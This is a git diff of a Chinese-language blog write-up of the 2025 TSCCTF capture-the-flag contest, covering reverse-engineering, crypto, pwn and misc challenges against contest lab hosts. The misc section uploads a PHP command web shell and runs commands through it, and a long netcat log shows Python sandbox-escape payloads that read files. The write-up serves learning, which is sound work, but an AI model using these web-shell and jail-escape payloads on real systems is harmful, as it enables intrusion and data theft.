@@ -2,31 +2,35 @@
 title: "2025 TSCCTF writeup"
 published: 2025-01-16T00:00:00.000Z
 description: ""
-tags: []
-category: "general"
+tags: [Writeups, CTF]
+category: CTF
 draft: false
 ---
 # 2025 TSCCTF owl_d writeup
+
 ## Welcome
 
 ### Give you a free flag
+
 ![image](https://hackmd.io/_uploads/HyswtsHwJe.png)
 反白就可以找到flag
 
 ### Please join our discord
+
 ![image](https://hackmd.io/_uploads/SJgaKoHP1l.png)
 在announcement這裡
 （我找了一天 哭）
 
-
 <!--more-->
 
-
 ### Feedback Form
+
 填問卷
 
 ## Reverse
+
 ### What_Happened
+
 丟到Ghidra去分析
 先看一下Defined Strings有沒有特別的
 ![image](https://hackmd.io/_uploads/SynloiHv1l.png)
@@ -39,16 +43,19 @@ draft: false
 
 ![image](https://hackmd.io/_uploads/B1BKnirPyg.png)
 找到之後全部對0xAA做XOR，最後就可以得到
+
 ```
 TSC{I_Think_you_Fix_2ome_3rror}
 ```
 
 ### Chill Checker
+
 丟到Ghidra做分析
 一樣先看Defined Strings有沒有重要的東西
 ![image](https://hackmd.io/_uploads/r1ZTpiHDJl.png)
 有跟flag相關的當然就直接go to過去了
 在那附近會先看到generate_flag()
+
 ```
 void generate_flag(char *param_1)
 
@@ -75,9 +82,11 @@ void generate_flag(char *param_1)
 }
 
 ```
+
 接著回去看一下symbol tree
 ![image](https://hackmd.io/_uploads/S1WiCsSDke.png)
 打開main會看到
+
 ```
 
 undefined8 main(void)
@@ -115,8 +124,10 @@ undefined8 main(void)
 
 
 ```
+
 發現裡面有跟一個complex_function相關
 也去把它打開看
+
 ```
 
 int complex_function(int param_1,int param_2)
@@ -134,6 +145,7 @@ int complex_function(int param_1,int param_2)
 ```
 
 所以，把目前有的資訊整理一下
+
 ```
 ci=((cp[i]−0x41−k)%26+26)%26+0x41
 where k=(i+8)×31.
@@ -146,18 +158,20 @@ Generated Flag:
 ![image](https://hackmd.io/_uploads/rkiakhSvyg.png)
 
 組合起來：
+
 ```
 TSC{t4k3_1t_3a$y}
 ```
 
-
 ### Gateway to the Reverse
+
 首先，先載下來丟進Ghidra
 然後觀察一下Symbol Tree
 ![image](https://hackmd.io/_uploads/Hy2tpYHDyl.png)
 把每一個function都點開來稍微看一下
 會發現FUN_00101090, FUN_001013d0是比較有內容的
 ![image](https://hackmd.io/_uploads/HybJAYSD1x.png)
+
 ```
 undefined8 FUN_00101090(void)
 
@@ -260,20 +274,27 @@ void FUN_001013d0(char *param_1,long param_2)
 ```
 
 這邊稍微對照一下兩邊的參數
+
 ```
 NL=rje+fS&eVP!RdK\x7F=e;{y6CG4Aif
 ```
+
 把它拿去轉換一下
+
 ```
 processed_char = (original_char XOR (position + 1)) + 5
 ```
+
 就可以得到
+
 ```
 TSC{th1s_1s_b4by_r3v3rs3_b4by}
 ```
 
 ## Pwn
+
 ### gamble_bad_bad
+
 > buffer 為 20 字節，jackpot_value 緊接在後麵，佔用 4 字節。
 > 如果輸入超過 20 字節，超出的部分將會覆寫 jackpot_value 的內容
 > 主要目標：將 jackpot_value 覆寫為 "777"
@@ -291,42 +312,57 @@ TSC{Gamb1e_Very_bad_bad_but_}
 ```
 
 ## Crypto
+
 ### Very Simple Login
+
 > 題目的程式碼中有這段
+
 ```
 if username == 'Admin':
                 print(f'FLAG : {FLAG}', end='\n\n')
                 sys.exit()
 ```
+
 所以只要有Admin身份即可
 ![image](https://hackmd.io/_uploads/S179E2SDkl.png)
+
 ```
 TSC{Wr0nG_HM4C_7O_L3A_!!!}
 ```
 
 ### Classic
+
 密文
+
 ```
 o`15~UN;;U~;F~U0OkW;FNW;F]WNlUGV"
 ```
+
 目前知道的原文
+
 ```
 TSC{..........}
 ```
-從題目的程式碼中可以看出加密關係是`f(x)=(Ax+B)mod94`
+
+從題目的程式碼中可以看出加密關係是 `f(x)=(Ax+B)mod94`
 所以是二元一次方程式->只要兩組x, y就可以解
 ![image](https://hackmd.io/_uploads/H13jPnrvye.png)
 
 代入可得
+
 ```
 A = 29 mod 94
 B = 27 mod 94
 ```
+
 所以回推反元素
+
 ```
 A^-1 = 13 mod 94
 ```
+
 有這三個就可以開始寫腳本解密了
+
 ```
 import string
 
@@ -354,13 +390,17 @@ decrypted_flag = "".join(plaintext)
 print(decrypted_flag)
 
 ```
+
 最後得到flag
+
 ```
 TSC{c14551c5_c1ph3r5_4r5_fr4g17e}
 ```
 
 ### Random Strange Algorithm
+
 先解梅森指數pair
+
 ```
 import math
 
@@ -391,12 +431,15 @@ for p_guess in mersenne_exps:
 print("Possible pairs that match bit length:", candidate_pairs)
 
 ```
+
 得到兩個pair
+
 ```
 (21701, 23209), (23209, 21701)
 ```
 
 再寫一個腳本計算
+
 ```
 def strange(x, y, p, q):
     return x + (y << p) + (y << q) - y
@@ -424,13 +467,13 @@ def decrypt_cipher(ct_int, p, q):
     """ 傳回解密後的 bytes """
     # 1) 計算 M
     M = (1 << (p+q)) - 1
-    
+  
     # 2) 計算群的 order
     #    若 2^p - 1 與 2^q - 1 都是 prime, 則 phi(2^p - 1) = 2^p - 2, etc.
     from math import gcd
     def lcm(a, b):
         return a*b // gcd(a, b)
-    
+  
     order_p = (1 << p) - 2   # 2^p - 2
     order_q = (1 << q) - 2   # 2^q - 2
     order   = lcm(order_p, order_q)
@@ -462,14 +505,16 @@ print("Try (23209, 21701) =>", plaintext2)
 ![image](https://hackmd.io/_uploads/BypFseUwJl.png)
 執行結果的尾巴就可以看到flag出現
 
-
 ## MISC
+
 ### A_BIG_BUG
+
 > 題目有提示要回頭看
 > 第一行有寫到連線smb的帳號ctfuser
 > 密碼我是一個一個慢慢試，最後發現“pass”剛好可以過
 
 接著開始寫php檔丟到他的upload裡面
+
 ```
 <?php
 // filename: simple_cmd.php
@@ -485,6 +530,7 @@ if (isset($_GET['cmd'])) {
 ```
 
 就可以開始進到我們的目標網站/upload下做一些壞壞的事（？
+
 ```
 http://172.31.0.2:30164/uploads/simple_cmd.php?cmd=ls%20-la%20/
 得到的結果
@@ -538,10 +584,12 @@ http://172.31.0.2:30166/uploads/simple_cmd.php?cmd=cat%20/tmp/flag.txt
 ```
 
 ### BabyJail
+
 > 其實我是一個一個慢慢去試看能不能繞過
 > 所以這邊貼我試過的所有可能性
 
 第一組（沒什麼進展 但總之至少有看到class了）
+
 ```
 ┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025TSCCTF]
 └─$ nc 172.31.3.2 8002
@@ -552,7 +600,7 @@ Traceback (most recent call last):
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   File "<string>", line 1, in <module>
 IndexError: list index out of range
-                                                                                                                                                                      
+                                                                                                                                                                    
 ┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025TSCCTF]
 └─$ nc 172.31.3.2 8002
 > [cls for cls in ().__class__.__base__.__subclasses__() if cls.__name__ == 'TextIOWrapper'][0]("/flag.txt").read()
@@ -562,27 +610,29 @@ Traceback (most recent call last):
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   File "<string>", line 1, in <module>
 IndexError: list index out of range
-                                                                                                                                                                      
+                                                                                                                                                                    
 ┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025TSCCTF]
 └─$ nc 172.31.3.2 8002
 > [cls.__name__ for cls in ().__class__.__base__.__subclasses__()]
 ['type', 'async_generator', 'bytearray_iterator', 'bytearray', 'bytes_iterator', 'bytes', 'builtin_function_or_method', 'callable_iterator', 'PyCapsule', 'cell', 'classmethod_descriptor', 'classmethod', 'code', 'complex', 'Token', 'ContextVar', 'Context', 'coroutine', 'dict_items', 'dict_itemiterator', 'dict_keyiterator', 'dict_valueiterator', 'dict_keys', 'mappingproxy', 'dict_reverseitemiterator', 'dict_reversekeyiterator', 'dict_reversevalueiterator', 'dict_values', 'dict', 'ellipsis', 'enumerate', 'filter', 'float', 'frame', 'frozenset', 'function', 'generator', 'getset_descriptor', 'instancemethod', 'list_iterator', 'list_reverseiterator', 'list', 'longrange_iterator', 'int', 'map', 'member_descriptor', 'memoryview', 'method_descriptor', 'method', 'moduledef', 'module', 'odict_iterator', 'PickleBuffer', 'property', 'range_iterator', 'range', 'reversed', 'symtable entry', 'iterator', 'set_iterator', 'set', 'slice', 'staticmethod', 'stderrprinter', 'super', 'traceback', 'tuple_iterator', 'tuple', 'str_iterator', 'str', 'wrapper_descriptor', 'zip', 'GenericAlias', 'anext_awaitable', 'async_generator_asend', 'async_generator_athrow', 'async_generator_wrapped_value', '_buffer_wrapper', 'MISSING', 'coroutine_wrapper', 'generic_alias_iterator', 'items', 'keys', 'values', 'hamt_array_node', 'hamt_bitmap_node', 'hamt_collision_node', 'hamt', 'legacy_event_handler', 'InterpreterID', 'line_iterator', 'managedbuffer', 'memory_iterator', 'method-wrapper', 'SimpleNamespace', 'NoneType', 'NotImplementedType', 'positions_iterator', 'str_ascii_iterator', 'UnionType', 'CallableProxyType', 'ProxyType', 'ReferenceType', 'TypeAliasType', 'Generic', 'TypeVar', 'TypeVarTuple', 'ParamSpec', 'ParamSpecArgs', 'ParamSpecKwargs', 'EncodingMap', 'fieldnameiterator', 'formatteriterator', 'BaseException', '_WeakValueDictionary', '_BlockingOnManager', '_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'BuiltinImporter', 'FrozenImporter', '_ImportLockContext', 'lock', 'RLock', '_localdummy', '_local', 'IncrementalNewlineDecoder', '_BytesIOBuffer', '_IOBase', 'ScandirIterator', 'DirEntry', 'WindowsRegistryFinder', '_LoaderBasics', 'FileLoader', '_NamespacePath', 'NamespaceLoader', 'PathFinder', 'FileFinder', 'AST', 'Codec', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_abc_data', 'ABC', 'Hashable', 'Awaitable', 'AsyncIterable', 'Iterable', 'Sized', 'Container', 'Buffer', 'Callable', '_wrap_close', 'Quitter', '_Printer', '_Helper']
-                                                                                                                                                                      
+                                                                                                                                                                    
 ┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025TSCCTF]
 └─$ 
 ```
+
 第二組（沒什麼進展）
+
 ```
 ┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025TSCCTF]
 └─$ nc 172.31.3.2 8002
 > [cls for cls in ().__class__.__base__.__subclasses__() if cls.__name__ == 'FileLoader'][0]
 <class '_frozen_importlib_external.FileLoader'>
-                                                                                                                                                                      
+                                                                                                                                                                    
 ┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025TSCCTF]
 └─$ nc 172.31.3.2 8002
 > [cls for cls in ().__class__.__base__.__subclasses__() if cls.__name__ == 'FileLoader'][0]('foo', '/flag.txt')
 <_frozen_importlib_external.FileLoader object at 0x7f5f5c5331d0>
-                                                                                                                                                                      
+                                                                                                                                                                    
 ┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025TSCCTF]
 └─$ nc 172.31.3.2 8002
 > [cls for cls in ().__class__.__base__.__subclasses__() if cls.__name__ == 'FileLoader'][0]('foo', '/flag.txt').get_data('/flag.txt').decode()
@@ -593,23 +643,24 @@ Traceback (most recent call last):
   File "<string>", line 1, in <module>
   File "<frozen importlib._bootstrap_external>", line 1189, in get_data
 FileNotFoundError: [Errno 2] No such file or directory: '/flag.txt'
-                                                                                                                                                                      
+                                                                                                                                                                    
 ┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025TSCCTF]
 └─$ nc 172.31.3.2 8002
 > [cls.__name__ for cls in ().__class__.__base__.__subclasses__() if cls.__name__ == 'FileLoader']
 ['FileLoader']
-                                                                                                                                                                      
+                                                                                                                                                                    
 ┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025TSCCTF]
 └─$ 
 ```
 
 第三組
+
 ```
 ┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025TSCCTF]
 └─$ nc 172.31.3.2 8002
 > [cls for cls in ().__class__.__base__.__subclasses__() if cls.__name__ == 'PathFinder'][0].find_spec('os').loader.load_module('os')
 <module 'os' from '/usr/local/lib/python3.12/os.py'>
-                                                                                                                                                                      
+                                                                                                                                                                    
 ┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025TSCCTF]
 └─$ nc 172.31.3.2 8002
 > [cls for cls in ().__class__.__base__.__subclasses__() if cls.__name__ == 'PathFinder'][0].find_spec('os').loader.load_module('os').open('flag.txt', 'r').read()
@@ -619,7 +670,7 @@ Traceback (most recent call last):
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   File "<string>", line 1, in <module>
 TypeError: 'str' object cannot be interpreted as an integer
-                                                                                                                                                                      
+                                                                                                                                                                    
 ┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025TSCCTF]
 └─$ nc 172.31.3.2 8002
 > __import__('os').system('cat ./flag.txt')
@@ -629,7 +680,7 @@ Traceback (most recent call last):
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   File "<string>", line 1, in <module>
 NameError: name '__import__' is not defined
-                                                                                                                                                                      
+                                                                                                                                                                    
 ┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025TSCCTF]
 └─$ nc 172.31.3.2 8002
 > _\u200b_import\u200b_os\u200b.system\u200b('cat flag.txt')
@@ -641,20 +692,20 @@ Traceback (most recent call last):
     _\u200b_import\u200b_os\u200b.system\u200b('cat flag.txt')
       ^
 SyntaxError: unexpected character after line continuation character
-                                                                                                                                                                      
+                                                                                                                                                                    
 ┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025TSCCTF]
 └─$ nc 172.31.3.2 8002
 > [cls for cls in ().__class__.__base__.__subclasses__() if cls.__name__ == 'PathFinder'][0].find_spec('os').loader.load_module('os').listdir('/home/pyjail/')
 ['.bashrc', '.profile', '.bash_logout', 'jail.py', 'run.sh']
-                                                                                                                                                                      
+                                                                                                                                                                    
 ┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025TSCCTF]
 └─$ nc 172.31.3.2 8002
 > [cls for cls in ().__class__.__base__.__subclasses__() if cls.__name__ == 'PathFinder'][0].find_spec('os').loader.load_module('os').listdir('/home/pyjail/')
 ['.bashrc', '.profile', '.bash_logout', 'jail.py', 'run.sh']
-                                                                                                                                                                      
+                                                                                                                                                                    
 ┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025TSCCTF]
 └─$ nc 172.31.3.2 8002
-> [cls for cls in ().__class__.__base__.__subclasses__() if cls.__name__ == 'PathFinder'][0].find_spec('os').loader.load_module('os').listdir('/home/pyjail/data/')^[[     
+> [cls for cls in ().__class__.__base__.__subclasses__() if cls.__name__ == 'PathFinder'][0].find_spec('os').loader.load_module('os').listdir('/home/pyjail/data/')^[[   
 Traceback (most recent call last):
   File "/home/pyjail/jail.py", line 3, in <module>
     print(eval(input('> '), {"__builtins__": {}}, {}))
@@ -663,17 +714,17 @@ Traceback (most recent call last):
     [cls for cls in ().__class__.__base__.__subclasses__() if cls.__name__ == 'PathFinder'][0].find_spec('os').loader.load_module('os').listdir(
                                                                                                                                                ^
 SyntaxError: '(' was never closed
-                                                                                                                                                                      
+                                                                                                                                                                    
 ┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025TSCCTF]
 └─$ nc 172.31.3.2 8002
 > [cls for cls in ().__class__.__base__.__subclasses__() if cls.__name__ == 'PathFinder'][0].find_spec('os').loader.load_module('os').listdir('/home')
 ['pyjail']
-                                                                                                                                                                      
+                                                                                                                                                                    
 ┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025TSCCTF]
 └─$ nc 172.31.3.2 8002
 > [cls for cls in ().__class__.__base__.__subclasses__() if cls.__name__ == 'PathFinder'][0].find_spec('os').loader.load_module('os').listdir('/')
 ['tmp', 'sbin', 'run', 'dev', 'boot', 'root', 'proc', 'media', 'lib', 'var', 'home', 'mnt', 'srv', 'etc', 'usr', 'bin', 'lib64', 'sys', 'opt', '.dockerenv', 'flag_LwAyYvKd']
-                                                                                                                                                                      
+                                                                                                                                                                    
 ┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025TSCCTF]
 └─$ nc 172.31.3.2 8002
 > [cls for cls in ().__class__.__base__.__subclasses__() if cls.__name__ == 'PathFinder'][0].find_spec('os').loader.load_module('os').listdir('/root')
@@ -683,17 +734,17 @@ Traceback (most recent call last):
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   File "<string>", line 1, in <module>
 PermissionError: [Errno 13] Permission denied: '/root'
-                                                                                                                                                                      
+                                                                                                                                                                    
 ┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025TSCCTF]
 └─$ nc 172.31.3.2 8002
 > [cls for cls in ().__class__.__base__.__subclasses__() if cls.__name__ == 'PathFinder'][0].find_spec('os').loader.load_module('os').listdir('/tmp')
 []
-                                                                                                                                                                      
+                                                                                                                                                                    
 ┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025TSCCTF]
 └─$ nc 172.31.3.2 8002
 > [cls for cls in ().__class__.__base__.__subclasses__() if cls.__name__ == 'PathFinder'][0].find_spec('os').loader.load_module('os').listdir('/usr')
 ['sbin', 'local', 'src', 'libexec', 'include', 'lib', 'bin', 'games', 'share']
-                                                                                                                                                                      
+                                                                                                                                                                    
 ┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025TSCCTF]
 └─$ nc 172.31.3.2 8002
 > [cls for cls in ().__class__.__base__.__subclasses__() if cls.__name__ == 'PathFinder'][0].find_spec('os').loader.load_module('os').listdir('/usr/bin')
@@ -702,16 +753,20 @@ PermissionError: [Errno 13] Permission denied: '/root'
 
 但其實後來我回頭再看一下自己試過的結果
 其中有一次是這樣
+
 ```
 ┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025TSCCTF]
 └─$ nc 172.31.3.2 8002
 > [cls for cls in ().__class__.__base__.__subclasses__() if cls.__name__ == 'PathFinder'][0].find_spec('os').loader.load_module('os').listdir('/')
 ['tmp', 'sbin', 'run', 'dev', 'boot', 'root', 'proc', 'media', 'lib', 'var', 'home', 'mnt', 'srv', 'etc', 'usr', 'bin', 'lib64', 'sys', 'opt', '.dockerenv', 'flag_LwAyYvKd']
 ```
+
 其實早就試出來了 我是小丑
 所以就趕快把它decode出來
+
 ```
 [cls for cls in ().__class__.__base__.__subclasses__() if cls.__name__ == 'FileLoader'][0]('foo', '/flag_LwAyYvKd/flag.txt').get_data('/flag_LwAyYvKd/flag.txt').decode()
 
 ```
+
 就得到flag了
